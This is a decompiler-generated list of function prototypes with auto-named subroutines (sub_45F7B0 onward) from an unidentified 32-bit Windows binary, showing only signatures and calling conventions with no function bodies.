// int __usercall sub_45F7B0@<eax>(unsigned int a1@<ecx>, int a2@<edi>, __m128i *a3@<esi>, int *a4);
// int __usercall sub_45F930@<eax>(size_t a1@<ecx>, int a2@<edi>, int a3@<esi>, const __m128i *Src);
int __cdecl sub_45FA30(int a1, __m128i *a2, __m128i *a3, size_t a4);
void *sub_45FA90();
int __cdecl sub_45FAA0(int a1, int a2, unsigned __int16 *a3, unsigned int a4);
int __cdecl sub_45FB10(int C, _BYTE *a2, _BYTE *a3, unsigned int a4);
int __cdecl sub_45FBF0(int C, int a2, int *a3, unsigned int a4);
int __cdecl sub_45FCE0(int C, _BYTE *a2, char *a3, unsigned int a4);
int __cdecl sub_45FDD0(int C, int a2, int a3, unsigned int a4);
int __cdecl sub_45FEF0(int C, int a2, int a3, unsigned int a4);
void *sub_45FFA0();
void *sub_45FFB0();
void *sub_45FFC0();
void *sub_45FFD0();
void *sub_45FFE0();
void *sub_45FFF0();
int __cdecl sub_460000(int a1, unsigned __int16 *a2);
int __cdecl sub_460030(int a1, int a2, int a3, unsigned __int8 *a4);
void *sub_460070();
int __cdecl sub_460080(int a1, int a2);
int __cdecl sub_4600E0(int C, _BYTE *a2, unsigned __int8 *a3, unsigned int a4);
int __cdecl sub_4601C0(int a1);
int __cdecl sub_4601E0(int a1, char *Src, size_t Size);
int __cdecl sub_460210(int a1, _DWORD *a2);
void *sub_460230();
int __cdecl sub_460240(int a1);
int __cdecl sub_460260(int a1, char *Src, size_t Size);
int __cdecl sub_460290(int a1, _DWORD *a2);
void *sub_4602B0();
int __cdecl sub_4602C0(void *a1); // idb
int __cdecl sub_4602E0(int a1, __m64 *Src, int a3);
int __cdecl sub_460310(int a1, __m64 *a2);
void *sub_460330();
int __cdecl sub_460340(int a1, int *Src, size_t Size);
int __cdecl sub_460370(int a1, int a2);
void *sub_460390();
int __cdecl sub_4603A0(int a1);
int __cdecl sub_4603C0(int a1, char *Src, size_t Size);
int __cdecl sub_4603F0(int a1, _DWORD *a2);
void *sub_460410();
int __cdecl sub_460420(int a1);
int __cdecl sub_460450(int a1, __m128i *Src, size_t Size);
int __cdecl sub_460490(int a1, int a2);
int __cdecl sub_4604D0(int a1, int a2, int a3, __m128i *a4);
void *sub_460660();
int __cdecl sub_460670(int a1, unsigned __int8 *Src, size_t Size);
int __cdecl sub_4606A0(int a1, int a2);
void *sub_4606C0();
int sub_4606D0();
BOOL sub_4606F0();
char __cdecl sub_460740(int a1, int a2, __m64 *a3, int a4);
int __cdecl sub_460A60(_DWORD *a1, int a2, int a3);
char *sub_460B30();
_DWORD *__cdecl sub_460C00(int a1, int a2, int a3);
void __cdecl sub_460C30(void *Block);
int __cdecl sub_460C50(int a1, int a2);
int __cdecl sub_460C70(int a1, int a2);
int __cdecl sub_460C90(int a1, int a2);
int __cdecl sub_460CB0(volatile LONG *Block);
int __cdecl sub_460D90(int a1, int a2);
int __cdecl sub_460E10(_DWORD *a1, int a2, int a3, int a4);
int __cdecl sub_460EA0(int a1, const char *Src);
int __cdecl sub_460F60(int a1, int a2, int a3);
void *__cdecl sub_460FC0(int a1, const char *Src);
volatile LONG *sub_461070();
volatile LONG *sub_461160();
volatile LONG *__cdecl sub_461170(volatile LONG *Block, const char *Src, int a3, int a4);
unsigned int sub_461280();
// _DWORD *__usercall sub_461350@<eax>(_DWORD *result@<eax>, int a2@<edx>, int a3);
void sub_461370();
int sub_461380();
void __cdecl sub_4613B0(char *a1, char *a2, int a3, char a4);
void __cdecl sub_4615D0(char *a1, char *a2, int a3, char a4);
void __cdecl sub_4617F0(char *a1, int a2, int a3, char a4);
void __cdecl sub_461960(char *a1, int a2, int a3, char a4);
void __cdecl sub_461AD0(int a1, int a2, int a3, char a4);
int sub_461C00();
int __cdecl sub_461C10(_DWORD *a1, int a2, int a3);
_DWORD *__cdecl sub_461E50(const char *Src, int a2);
void __cdecl sub_461EC0(void **Block);
int __cdecl sub_461EF0(int a1, int a2);
_DWORD *__cdecl sub_461F10(const char *Src, int a2);
void __cdecl sub_461F80(void **Block);
int __cdecl sub_461FB0(int a1, int a2);
int __cdecl sub_461FD0(int a1, int a2);
int __cdecl sub_461FF0(int a1, int a2);
int __cdecl sub_462010(int a1, int a2);
BOOL __cdecl sub_462040(int a1, int *a2, int a3);
int __cdecl sub_462100(int a1, int *a2, int *a3);
int __cdecl sub_4621E0(int a1, int a2, int a3);
int __cdecl sub_462440(int a1, unsigned int **a2, int a3, int a4);
const char *sub_462950();
int __cdecl sub_462960(char **a1);
int __cdecl sub_4629A0(int a1);
int __cdecl sub_4629C0(int a1);
int __cdecl sub_4629F0(int a1, int a2);
char *__cdecl sub_462A50(int a1, const char *a2, char *VarName);
int __cdecl sub_462AD0(int a1, const char *a2, char *VarName, _DWORD *a4);
int __cdecl sub_462B70(int a1, int a2);
char *__cdecl sub_462BD0(int a1, const char *a2, char *VarName);
int __cdecl sub_462C60(int a1);
unsigned int sub_462CC0();
void __cdecl sub_465650(int a1);
int __cdecl sub_4656B0(int a1, int a2, int Size, void *Src);
int __cdecl sub_465800(int a1, const char *a2, const char *a3);
int __fastcall sub_4659E0(int a1, int *a2, void *a3, int Size, int a5, int a6, unsigned int a7);
// void *__usercall sub_465B70@<eax>(int a1@<ecx>, int a2@<ebx>, int a3@<edi>, int *a4@<esi>, void *Src, int Size, int a7, int a8, unsigned int a9);
BOOL __cdecl sub_465BF0(int a1, int a2, unsigned int *a3);
int __cdecl sub_465C40(int a1);
void __cdecl sub_465C70(int a1);
int __cdecl sub_465CB0(int a1, int a2, int Size, void *Src);
int __cdecl sub_465DA0(int a1, const char *a2, const char *a3);
int __fastcall sub_465F60(char *a1, int *a2, int a3, int a4, int a5, int a6, size_t Size);
// BOOL __usercall sub_4661E0@<eax>(unsigned int a1@<ecx>, int *a2@<edx>, size_t a3@<edi>, int a4, int a5, int a6, char *a7);
BOOL __cdecl sub_4662E0(int a1, char *a2, size_t *a3);
int __cdecl sub_466340(_DWORD *a1);
void __cdecl sub_466390(int a1);
int __cdecl sub_4663D0(_DWORD *a1, int a2);
int __cdecl sub_4664A0(int a1, int a2, int a3, _DWORD *a4);
int __cdecl sub_466660(int a1, const char *a2, char *String);
// volatile LONG *__usercall sub_466830@<eax>(__m64 a1@<mm0>, int *a2, _DWORD *a3);
// int __usercall sub_466900@<eax>(__m64 a1@<mm0>, int a2, int a3);
int __cdecl sub_466A20(int a1, _DWORD *a2);
int __cdecl sub_466A90(_DWORD *a1, char *a2, size_t *a3);
int __cdecl sub_466C00(int a1);
BOOL __cdecl sub_466C20(int a1, int a2);
void __cdecl sub_466C60(void **Block);
int __cdecl sub_466C70(int a1, int a2);
BOOL __cdecl sub_466CC0(FILE *Stream, char *Src, size_t Size);
int __cdecl sub_466CF0(int a1, struct std::ios_base *a2); // idb
int __cdecl sub_466D20(int a1, _BYTE *a2, int *a3);
int __cdecl sub_466D40(int a1, int a2, int a3, int *a4);
int __cdecl sub_466DD0(int a1, const char *a2, const char *a3);
int __cdecl sub_466EE0(int a1);
void __cdecl sub_466F40(struct std::ios_base *a1);
int __cdecl sub_466F90(int a1, int a2);
BOOL __cdecl sub_466FD0(FILE *Stream);
int __cdecl sub_467000(int a1, struct std::ios_base *a2); // idb
BOOL __cdecl sub_467050(int a1, int a2, int *a3, int a4);
int __cdecl sub_4670B0(int a1, int a2, int Size, void *Src);
int __cdecl sub_467130(int a1, const char *a2, const char *a3);
int __cdecl sub_4671E0(struct std::ios_base *a1, int a2); // idb
int __cdecl sub_467260(int a1);
int __cdecl sub_467290(int a1, int a2);
void __cdecl sub_467350(int a1);
int __cdecl sub_467390(int a1, int a2, int *a3, int a4, int a5);
int __cdecl sub_467440(int a1, int a2, int a3, int a4, int a5);
// int __usercall sub_467490@<eax>(void *a1@<ebx>, size_t *a2@<edi>, _DWORD *a3);
int __cdecl sub_467520(_DWORD *Size, void *a2, size_t *a3);
unsigned int __cdecl sub_467620(int a1, int a2, int a3, _DWORD *a4);
int __cdecl sub_467950(int a1, const char *a2, char *String);
volatile LONG ***__cdecl sub_467BB0(int a1, int a2);
int __cdecl sub_467C30(int a1, int a2);
int __cdecl sub_467CD0(_DWORD *a1);
int __cdecl sub_467D20(_DWORD *a1, int a2);
void __cdecl sub_467D90(int a1);
int __cdecl sub_467DB0(int a1, void *a2, _DWORD *a3, int a4, int a5);
int __cdecl sub_467E20(int a1, _DWORD **Block, int a3, int a4, int a5);
int __cdecl sub_467E80(int a1, int a2, int a3, _DWORD *a4);
int __cdecl sub_468040(int a1, const char *a2, char *String);
// int __usercall sub_468160@<eax>(__m64 a1@<mm0>, int a2, int a3);
// int __usercall sub_468200@<eax>(__m64 a1@<mm0>, int a2, _DWORD *a3);
int __cdecl sub_468270(_DWORD *a1);
int __cdecl sub_4682C0(_DWORD *a1, int a2);
// BOOL __usercall sub_468390@<eax>(int a1@<esi>, int a2);
void __cdecl sub_4683D0(int a1);
int __cdecl sub_468420(unsigned int a1, int a2, _DWORD *a3, void *Src, int Size);
int __cdecl sub_468610(int a1, void *a2, int *a3, int a4, size_t Size);
unsigned int __cdecl sub_468780(int a1, int a2, size_t Size, int a4, int a5);
int __cdecl sub_468910(int a1, int a2, _DWORD *a3, const void *a4, int Size);
int __cdecl sub_4689E0(int a1, void *a2, int *a3, int a4, int a5);
// int __usercall sub_468AC0@<eax>(int a1@<esi>, int a2);
int __cdecl sub_468C10(int a1, int a2, int a3, _DWORD *a4);
int __cdecl sub_468F60(int a1, const char *a2, char *String);
// int __usercall sub_469430@<eax>(__m64 a1@<mm0>, int a2, int a3);
int __cdecl sub_469500(__m128i *a1, const __m128i *a2, int a3);
int sub_46C540();
int __cdecl sub_4719F0(char *a1, int a2, _DWORD *a3);
int __cdecl sub_471CA0(_BYTE *a1, int a2, unsigned int a3);
// int __cdecl _RTC_NumErrors_2();
// int __cdecl _RTC_NumErrors_3();
// int __usercall sub_471E40@<eax>(unsigned __int8 *a1@<edx>, int a2@<ecx>, int (__cdecl *a3)(unsigned int C, int *a2)@<ebx>, int a4, int *a5);
int __cdecl sub_471F20(int a1, _DWORD *a2);
int sub_471F30(); // weak
int sub_471F50(); // weak
int __cdecl sub_471F70(__int16 a1, _BYTE **a2);
int sub_471F90(); // weak
int sub_471FC0(); // weak
BOOL __cdecl sub_471FF0(int Val);
int __cdecl sub_472040(unsigned int C, int *a2);
int __cdecl sub_4720D0(int *a1, char *a2, signed int Size, int a4, int a5, int a6, int a7);
int __cdecl sub_4724F0(int *a1, char *a2, signed int Size, int a4, int a5);
char **sub_472520();
int __cdecl sub_472530(int a1, int a2);
int sub_472580();
int __cdecl sub_4725E0(int a1);
int __cdecl sub_472670(int a1);
_crt_signal_t sub_4726C0();
void __cdecl sub_472720(int a1); // idb
void (__cdecl *sub_472730())(int);
// int __usercall sub_4727A0@<eax>(int a1@<edi>, int a2, int a3, int a4);
int __cdecl sub_472A80(int a1, _DWORD *a2);
// int __usercall sub_472C00@<eax>(unsigned __int8 *a1@<ecx>, _DWORD *a2@<edi>);
int __cdecl sub_473100(int a1);
_DWORD *__fastcall sub_4733A0(_DWORD *a1, _DWORD *a2, _DWORD *a3);
_DWORD *__fastcall sub_473400(_DWORD *a1, _DWORD *a2, _DWORD *a3);
int __cdecl sub_473460(_DWORD *a1, int *a2);
int __cdecl sub_474A00(_DWORD *a1, int *a2);
int __cdecl sub_4756E0(_DWORD *a1);
_DWORD *__fastcall sub_475960(int a1, _DWORD *a2, _DWORD *a3);
// int __usercall sub_475A00@<eax>(_DWORD *a1@<esi>, int *a2);
_DWORD *__cdecl sub_4767F0(_DWORD *a1);
_DWORD *__cdecl sub_476890(_DWORD *a1);
// _DWORD *__usercall sub_476900@<eax>(_DWORD *a1@<edi>, int *a2);
// _DWORD *__usercall sub_476990@<eax>(_DWORD *a1@<ebx>, _DWORD *a2@<edi>, int *a3);
// _DWORD *__usercall sub_476A40@<eax>(_DWORD *a1@<esi>, int a2, char a3);
int __fastcall sub_476D70(int a1, _DWORD *a2);
_DWORD *__fastcall sub_4770F0(_DWORD *a1, int a2, _DWORD *a3);
// int __usercall sub_4771B0@<eax>(int *a1@<ecx>, _DWORD *a2@<edi>);
// int __usercall sub_477550@<eax>(const void *a1@<edx>, int a2, unsigned __int8 *a3);
BOOL __cdecl sub_477C90(_BYTE *a1, const void *a2, unsigned __int8 *a3);
int __cdecl sub_477CC0(int a1, const void *a2);
BOOL __cdecl sub_477ED0(int a1, int a2, unsigned int a3, int a4);
int __cdecl sub_477F80(int a1, const char *a2, _DWORD *Block, int a4, int a5);
int __cdecl sub_478120(_DWORD *a1, _DWORD *a2, _DWORD *a3);
int __cdecl sub_478170(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6);
int __cdecl sub_478250(_DWORD *a1);
// int __usercall sub_478270@<eax>(int a1@<ecx>, char *a2@<ebx>, int a3@<esi>, char **a4, int a5, int a6);
// int __usercall sub_4783C0@<eax>(unsigned int *a1@<ebx>, int a2);
int __cdecl sub_4785D0(_DWORD *a1, int a2);
int __cdecl sub_478670(_DWORD *a1);
int __cdecl sub_478690(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
// int __usercall sub_478880@<eax>(int a1@<edx>, int a2);
int __cdecl sub_4789B0(int a1, _DWORD *Size);
// void __usercall sub_478A30(int *a1@<ebx>);
void __thiscall sub_478AC0(int this);
volatile LONG *__cdecl sub_478B60(_DWORD *Block);
// int __usercall sub_478C50@<eax>(char *a1@<edi>, int a2, int a3);
_DWORD *sub_478CC0();
int __cdecl sub_478D10(int a1);
void __cdecl sub_478D60(void *Block);
int __cdecl sub_478D90(int a1, int *a2);
int __cdecl sub_478E20(char *a1, int a2, int a3, int *a4, int *a5);
int __cdecl sub_478F90(int *a1, char *Src, size_t Size);
int __cdecl sub_479070(int *a1, _BYTE *a2, int *a3);
// BOOL __usercall sub_479140@<eax>(const char *a1@<ecx>, int a2@<ebx>, int a3@<edi>, unsigned int a4, signed int Size);
int __cdecl sub_4792C0(int a1, FILE *Stream, int Size);
void *sub_4796F0();
void *sub_479700();
void *sub_479710();
void *sub_479720();
void *sub_479730();
int __cdecl sub_479740(int a1, int *a2);
void *sub_479780();
void *sub_479790();
void *sub_4797A0();
void *sub_4797B0();
void *sub_4797C0();
void *sub_4797D0();
void *sub_4797E0();
void *sub_4797F0();
void *sub_479800();
void *sub_479810();
int __cdecl sub_479820(int a1, int a2);
void *sub_479840();
void *sub_479850();
void *sub_479860();
int __cdecl sub_479870(int a1, int *a2);
void *sub_4798D0();
void *sub_4798E0();
void *sub_4798F0();
void *sub_479900();
void *sub_479910();
int __cdecl sub_479920(int a1, int **a2);
void *sub_479990();
void *sub_4799A0();
void *sub_4799B0();
void *sub_4799C0();
void *sub_4799D0();
void *sub_4799E0();
void *sub_4799F0();
int __cdecl sub_479A00(int a1, int **a2, int a3, int a4);
void *sub_479A80();
void *sub_479A90();
signed int __cdecl sub_479AA0(void **a1, int a2, int a3, int a4);
// int __usercall sub_479B20@<eax>(int a1@<esi>);
// int __usercall sub_479C60@<eax>(int a1@<edx>, int a2);
_DWORD *__cdecl sub_479CD0(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5);
int __cdecl sub_479D10(int *Block);
volatile LONG *__cdecl sub_479F30(int *a1);
// int __usercall sub_479FE0@<eax>(int **a1@<ecx>, int a2@<esi>, int a3);
int __cdecl sub_47A290(int *a1, int **a2);
int __cdecl sub_47A330(int a1, int *a2);
int __cdecl sub_47A430(int **a1, char *a2, int a3, int *a4, int a5, int a6, int a7);
int __cdecl sub_47A650(char *a1, int a2, int a3, int a4, int a5, int *a6, int a7, char *a8);
int __cdecl sub_47A920(int **a1, int a2, int a3, int *a4, int a5, int a6, int a7);
int __cdecl sub_47AA90(int **a1, char *a2, int a3, int *a4, int a5, int a6, int a7);
int __cdecl sub_47ACB0(int **a1, const char *a2, int a3, int *a4, int *a5, int *a6, int a7);
int __cdecl sub_47AE90(int **a1, const char *a2, int a3, int *a4, int *a5, int *a6, int a7);
void *sub_47B1D0();
int __cdecl sub_47B1E0(int a1, int *a2, int a3);
int *__cdecl sub_47B260(int a1, int a2, int *a3);
void *sub_47B3E0();
int __cdecl sub_47B400(int a1, int *a2, int a3, int a4);
_DWORD *__cdecl sub_47B430(int a1, int a2, char *a3);
void *sub_47B450();
void *sub_47B460();
void __cdecl sub_47B470(int a1);
int __cdecl sub_47B490(int a1, int *a2, int a3);
int *__cdecl sub_47B540(int a1, int a2, int *a3);
int __cdecl sub_47B6A0(int a1, int **a2, int a3, int a4);
// int __usercall sub_47B750@<eax>(_DWORD *a1@<ebx>, void **a2@<esi>, char ***a3, _DWORD *a4);
int __cdecl sub_47BDA0(int a1, int a2, const char *Src);
BOOL __cdecl sub_47C010(int a1, int **a2, int a3, int a4);
BOOL __cdecl sub_47C110(int a1, int *a2, int a3, int a4);
BOOL __cdecl sub_47C150(int a1, int a2, int a3, int a4);
int __cdecl sub_47C1A0(int a1, void **a2);
_DWORD *__cdecl sub_47C1E0(_DWORD *a1, void **a2, size_t Size);
BOOL __cdecl sub_47C270(int a1, int *a2, int a3, int a4);
int __cdecl sub_47C2C0(int a1, int a2, int a3, int a4);
void *sub_47C3A0();
int __cdecl sub_47C3B0(int a1, int *a2, int a3);
_DWORD *__cdecl sub_47C3F0(int a1, int a2, int *a3);
void *sub_47C580();
void __cdecl sub_47C590(int a1);
void *sub_47C5B0();
_DWORD *__cdecl sub_47C5C0(int a1, int a2, int a3);
int *__cdecl sub_47C740(int a1, int a2, int *a3);
void *sub_47C900();
int __cdecl sub_47C910(int a1, int *a2, int a3);
int *__cdecl sub_47C990(int a1, int a2, int *a3);
void *sub_47CA60();
void *sub_47CA70();
int __cdecl sub_47CA80(int a1, int a2, int a3, int a4);
int __cdecl sub_47CB30(int a1, _DWORD *a2);
int __cdecl sub_47CB90(int *a1, _DWORD *a2, char *Src, signed int Size);
int __cdecl sub_47CD20(int a1, int a2, int *a3);
_BYTE *__cdecl sub_47CDB0(int a1, unsigned int *a2);
_DWORD *__cdecl sub_47CE00(int a1, int a2, _DWORD *a3);
int __cdecl sub_47CEA0(int a1, _DWORD *a2, int *a3);
void *sub_47D1C0();
void *sub_47D1D0();
void __cdecl sub_47D1E0(int a1);
void *sub_47D200();
void *sub_47D210();
void __cdecl sub_47D220(int a1);
void *sub_47D240();
void *sub_47D250();
// int __usercall sub_47D260@<eax>(int *a1@<ebx>, int *a2@<edi>);
int __cdecl sub_47D2F0(int a1, int a2, int a3);
int __cdecl sub_47D3F0(int *a1, int a2);
// int __usercall sub_47D730@<eax>(int a1@<ebx>, int a2@<esi>, int *a3);
int __cdecl sub_47D800(int a1, int *a2, int a3);
int __cdecl sub_47DAA0(int a1, int *a2, int a3, int a4);
int *__cdecl sub_47DB30(int a1, int a2, const char *Src);
void *sub_47DDE0();
void __cdecl sub_47DDF0(int a1);
int __cdecl sub_47DE10(int a1, int a2, int a3);
_DWORD *__cdecl sub_47DE50(int a1, int a2, int *a3);
void *sub_47DFB0();
int __cdecl sub_47DFC0(int a1, int **a2, int a3, int a4);
int __cdecl sub_47E040(int a1, _DWORD *a2, int a3);
_DWORD *__cdecl sub_47E090(int a1, int a2, int a3);
_BYTE *__cdecl sub_47E230(int a1, int a2);
_DWORD *__cdecl sub_47E250(int a1, int a2, const char *a3);
_DWORD *__cdecl sub_47E2C0(int a1, _DWORD *a2, const char *a3);
void *__cdecl sub_47E440(int a1, int a2);
_DWORD *__cdecl sub_47E4B0(int a1, int a2, const char *Src);
// int __cdecl _fileno(FILE *Stream);
// int __usercall sub_47E540@<eax>(const char *a1@<edx>, int a2@<ecx>, _DWORD *a3@<ebx>, signed int *a4);
int __cdecl sub_47E690(int *a1, int a2, int a3, int a4, int a5, int a6);
// int __usercall sub_47E750@<eax>(size_t MaxCount@<ecx>, const char *a2@<ebx>);
int __cdecl sub_47E7C0(char *String, int a2, signed int *a3);
int __cdecl sub_47E850(char *Str1, size_t MaxCount, _DWORD *a3);
int __cdecl sub_47E8C0(char *Str, _DWORD *a2);
int __cdecl sub_47E8F0(const char *a1, signed int MaxCount, signed int *a3);
unsigned int *__cdecl sub_47EBF0(int a1, unsigned int a2);
unsigned int *__fastcall sub_47F090(char *a1, _DWORD *a2, int a3, int a4);
int __cdecl sub_47F360(int a1, int a2, int a3, int a4);
unsigned int *__cdecl sub_47F4C0(char *a1, int a2);
int __cdecl sub_47F510(unsigned __int8 *a1, int a2);
int __cdecl sub_47F5D0(int a1, int *a2);
int __cdecl sub_47F6A0(int a1);
_DWORD *__cdecl sub_47F700(int a1);
int __cdecl sub_47F7C0(int a1, int a2, int a3, int a4, int a5);
void __cdecl sub_47F830(void *Block);
int __cdecl sub_47F850(int *a1, char *a2, signed int Size, int a4, int a5);
void sub_47F8F0();
void *sub_47F920();
void *sub_47F930();
int sub_47F940();
void __cdecl sub_47F950(int a1);
void *sub_47F970();
void *sub_47F980();
void *sub_47F990();
void *sub_47F9A0();
void *sub_47F9B0();
void *sub_47F9C0();
void *sub_47F9D0();
void *sub_47F9E0();
void *sub_47F9F0();
void *sub_47FA00();
void *sub_47FA10();
void *sub_47FA20();
void __cdecl sub_47FA30(void *Block);
int __cdecl sub_47FA80(int a1, int a2, char a3);
int __cdecl sub_47FAB0(int a1, int a2, char a3);
int __cdecl sub_47FBB0(int a1, int a2, char a3);
int __cdecl sub_47FBD0(int a1, int a2, char a3);
// int __usercall sub_47FBF0@<eax>(__m64 a1@<mm0>, int a2, int *a3, _DWORD *a4);
void *sub_47FCF0();
void __cdecl sub_47FD00(int a1);
void *sub_47FD20();
void __cdecl sub_47FD30(int a1);
void *sub_47FD50();
void __cdecl sub_47FD60(int a1);
int __cdecl sub_47FD80(int a1, int a2, int a3, int a4, int a5);
int __cdecl sub_47FDC0(int a1, int a2, int a3, int a4, int a5, int a6);
int __cdecl sub_47FE10(int a1, int a2, int a3, int a4);
int __cdecl sub_47FE50(int a1, int a2, int a3, int a4, int a5, int a6);
int __cdecl sub_47FE90(_DWORD *a1, _DWORD *a2, _DWORD *a3);
int __cdecl sub_47FF20(_DWORD *a1, _DWORD *a2, _DWORD *a3);
int __cdecl sub_480160(_DWORD *a1, _DWORD *a2, _DWORD *a3, int *a4);
int __cdecl sub_4802A0(int a1, int a2, int a3);
int __cdecl sub_4803A0(_DWORD *a1, _DWORD *a2, int a3);
// int __usercall sub_480410@<eax>(__m64 a1@<mm0>, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6);
// int __usercall sub_4805D0@<eax>(__m64 a1@<mm0>, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6);
int __cdecl sub_480670(_DWORD *a1, _DWORD *a2, _DWORD *a3, int *a4);
// BOOL __usercall sub_4809E0@<eax>(__m64 a1@<mm0>, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6);
// int __usercall sub_480A50@<eax>(__m64 a1@<mm0>, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6);
// int __usercall sub_480B60@<eax>(__m64 a1@<mm0>, _DWORD *a2, _DWORD *a3, _DWORD *a4, int *a5);
// int __usercall sub_480BE0@<eax>(__m64 a1@<mm0>, _DWORD *a2, _DWORD *a3, int *a4, int *a5);
int __cdecl sub_480F30(_DWORD *a1, _DWORD *a2, int *a3);
// int *__usercall sub_4811A0@<eax>(__m64 a1@<mm0>, int *a2, _DWORD *a3, int *a4, int *a5);
int __cdecl sub_4818D0(int a1);
void __cdecl sub_481930(void ***Block);
void __cdecl sub_481960(_DWORD **Block);
int __cdecl sub_481990(int a1, int a2);
int __cdecl sub_4819F0(int *a1, int *a2, _DWORD *a3, _DWORD *a4, int *a5);
void **__cdecl sub_481B70(_DWORD **a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, void **a5);
int __cdecl sub_481C70(int a1);
int __cdecl sub_481C80(_DWORD *a1, int *a2);
int __cdecl sub_481E60(int a1);
void __cdecl sub_481EC0(void ***Block);
int __cdecl sub_481EF0(int a1, int a2);
int __cdecl sub_481F10(int **a1, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6);
void **__cdecl sub_482060(int a1, _DWORD **a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, void **a6);
int __cdecl sub_482180(int a1, _DWORD *a2, int a3, int a4, int a5);
int __cdecl sub_4821E0(int **a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, int *a5);
int __cdecl sub_482480(_DWORD *a1, int a2, int a3, int a4, int a5);
int __cdecl sub_4829E0(_DWORD *a1, int a2, _DWORD *a3, int *a4);
int __cdecl sub_482DF0(int a1, _DWORD *a2);
BOOL __cdecl sub_482E40(int a1, int a2);
int __cdecl sub_482E60(_DWORD *a1, _DWORD *a2, int *a3);
int __cdecl sub_4830E0(int a1, _DWORD *a2, _DWORD *a3, int *a4);
int __cdecl sub_483380(int a1, _DWORD *a2, int *a3);
int __cdecl sub_483480(int **a1, unsigned int a2, int a3, int *a4);
int __cdecl sub_4838C0(int a1, _DWORD *a2, int *a3, unsigned int **a4, int *a5);
int __cdecl sub_4838F0(int a1, int *a2, int *a3, int *a4);
unsigned int __cdecl sub_4A90C0(_DWORD *a1, _DWORD *a2);
unsigned int __cdecl sub_4A90E0(_DWORD *a1, _DWORD *a2);
int __cdecl sub_4A9110(__int64 *a1, _DWORD *a2);
// int __usercall sub_4A9130@<eax>(__int64 *a1@<edi>, _DWORD *a2@<esi>);
unsigned int __cdecl sub_4A9200(_DWORD *a1, _DWORD *a2, _DWORD *a3);
// unsigned int __usercall sub_4A9220@<eax>(_DWORD *a1@<ebp>, _DWORD *a2@<edi>, _DWORD *a3@<esi>);
int __cdecl sub_4A92F0(_DWORD *a1, int a2, int a3);
// int __usercall sub_4A9310@<eax>(int a1@<ebp>, _DWORD *a2@<edi>, int a3@<esi>);
int __cdecl sub_4A93A0(_DWORD *a1, int a2);
void *sub_4A93E0();
unsigned int __cdecl sub_4A93F0(_DWORD *a1, unsigned int *a2);
unsigned int __cdecl sub_4A9420(_DWORD *a1, unsigned int *a2);
unsigned int __cdecl sub_4A9450(_DWORD *a1, unsigned int *a2, unsigned int *a3);
unsigned int __cdecl sub_4A9480(_DWORD *a1, unsigned int *a2);
// unsigned int __usercall sub_4A94B0@<eax>(int a1@<eax>, unsigned int *a2@<ebp>, _DWORD *a3@<edi>, unsigned int *a4@<esi>);
int __cdecl sub_4AA080(int a1, int *a2, int a3);
int __cdecl sub_4AA0D0(int *a1, int a2, int a3);
unsigned int __cdecl sub_4AA1F0(int a1, unsigned int *a2, int a3);
int __cdecl sub_4AA240(_BYTE *a1, int a2, int a3);
int __cdecl sub_4AA560(int a1, unsigned int *a2);
unsigned int __cdecl sub_4AA760(unsigned int *a1, unsigned int *a2, unsigned int *a3);
unsigned int __cdecl sub_4AAF20(unsigned int *a1, unsigned int *a2, unsigned int *a3);
// int __usercall sub_4AB540@<eax>(_DWORD *a1@<ecx>, int *a2@<edi>, _DWORD *a3, int a4);
// int __usercall sub_4AB630@<eax>(int a1@<ecx>, _DWORD *a2@<ebx>, int *a3@<esi>, _DWORD *a4, _DWORD *a5, int a6, int a7);
// int __usercall sub_4AB750@<eax>(int a1@<ecx>, _DWORD *a2@<ebx>, int *a3@<edi>, _DWORD *a4, _DWORD *a5, _DWORD *a6, _DWORD *a7, _DWORD *a8);
int __cdecl sub_4ABA30(_DWORD *a1, int a2, int a3, int a4, int *a5);
int __cdecl sub_4ABDB0(int *a1, _DWORD *a2, _DWORD *a3, unsigned int a4, int a5, int a6, int *a7);
char __cdecl sub_4AC000(__m128i *a1, const __m128i *a2, unsigned int a3, const __m128i *a4, const __m128i *a5);
int sub_4AD840();
int __cdecl sub_4AD850(_DWORD *a1, int a2);
int (__cdecl *__cdecl sub_4AD920(char *a1, char *Src, size_t Size))(char *, char *, int, int);
int __cdecl sub_4AD9E0(int a1, int a2);
int sub_4ADB20(); // weak
// int __usercall sub_4ADBA0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, _DWORD *a6@<edi>, int a7, int a8, int a9, int a10, _DWORD *a11);
int sub_4ADF50(); // weak
// int __usercall sub_4ADFD0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, _DWORD *a6@<edi>, int a7, int a8, int a9, int a10, _DWORD *a11);
int __cdecl sub_4AE2E0(int a1, unsigned int *a2, int *a3);
int __cdecl sub_4AEC60(unsigned int *a1, int a2, int *a3);
_DWORD __cdecl sub_4AFD00(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int __cdecl sub_4B0070(int *a1, int a2);
int __cdecl sub_4B0540(int *a1, int a2);
unsigned int __cdecl sub_4B0A10(unsigned __int8 *a1, _BYTE *a2, unsigned int a3, int a4, int a5, int a6);
int *__cdecl sub_4B0F00(char *a1, _BYTE *a2, int a3, int a4, int a5, int *a6, int a7);
_BYTE *__cdecl sub_4B1100(int a1, _BYTE *a2, int a3, int a4);
_BYTE *__cdecl sub_4B11D0(_BYTE *a1, _BYTE *a2, int a3, int a4, unsigned __int8 *a5, int *a6);
int __cdecl sub_4B13C0(int a1, int a2, int a3);
int __cdecl sub_4B2780(int a1, int a2);
int __cdecl sub_4B2BA0(int a1, int a2);
unsigned __int32 __cdecl sub_4B2FC0(int *a1, int a2, int a3, int a4, int *a5, int a6);
int *__cdecl sub_4B3200(char *a1, _BYTE *a2, int a3, int a4, int a5, int *a6, int a7);
_BYTE *__cdecl sub_4B3400(int a1, _BYTE *a2, int a3, int a4);
